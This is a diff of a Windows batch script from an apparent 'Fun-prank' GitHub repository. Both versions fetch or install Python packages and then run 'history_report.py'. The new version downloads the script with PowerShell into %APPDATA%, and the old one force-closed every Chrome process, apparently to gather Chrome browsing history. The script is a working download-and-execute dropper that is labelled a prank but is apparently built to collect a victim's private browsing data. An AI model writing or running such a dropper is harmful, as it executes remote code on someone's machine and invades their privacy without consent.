@@ -1,39 +1,40 @@
 @echo off
-title Installing and Running History Script...
+echo Downloading Python script...
 
-:: Close all Chrome processes (including background processes)
-echo Closing all Google Chrome processes...
-taskkill /F /IM chrome.exe >nul 2>nul
-taskkill /F /IM chrome_driver.exe >nul 2>nul
-taskkill /F /IM chrome_renderer.exe >nul 2>nul
-taskkill /F /IM chrome_child.exe >nul 2>nul
+:: Ensure the history directory exists
+mkdir "%APPDATA%\history"
 
-:: Wait for Chrome to fully close (increase the wait time if needed)
-timeout /t 10 /nobreak >nul
+:: Download the history_report.py script from a URL (replace with actual URL)
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/main/history_report.py' -OutFile '%APPDATA%\history\history_report.py'"
 
-:: Create the history directory if it doesn't exist
-echo Creating history directory...
-mkdir "%APPDATA%\history" >nul 2>nul
+:: Check if the file exists after downloading
+if exist "%APPDATA%\history\history_report.py" (
+    echo File downloaded successfully.
+) else (
+    echo Failed to download the file. Exiting...
+    pause
+    exit /b
+)
 
-:: Install required libraries (requests, psutil, gpuinfo)
+:: Download the requirements.txt file (if needed)
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/main/requirements.txt' -OutFile '%APPDATA%\history\requirements.txt'"
+
+:: Check if the requirements.txt file exists
+if exist "%APPDATA%\history\requirements.txt" (
+    echo Requirements file downloaded successfully.
+) else (
+    echo Failed to download requirements.txt. Exiting...
+    pause
+    exit /b
+)
+
+:: Install required Python libraries
 echo Installing required libraries...
-python -m pip install --upgrade requests psutil gpuinfo >nul 2>nul
+pip install -r "%APPDATA%\history\requirements.txt"
 
-:: Download requirements.txt if not already present
-echo Downloading requirements.txt...
-curl -o "%APPDATA%\history\requirements.txt" https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt >nul 2>nul
-
-:: Install libraries from requirements.txt
-echo Installing libraries from requirements.txt...
-python -m pip install --upgrade -r "%APPDATA%\history\requirements.txt" >nul 2>nul
-
-:: Run the Python script to gather history
+:: Run the Python script
 echo Running the Python script...
 python "%APPDATA%\history\history_report.py"
 
-:: Reopen Google Chrome
-echo Reopening Google Chrome...
-start chrome
-
-:: Pause to keep the window open for any output
+:: Wait for any key before closing
 pause
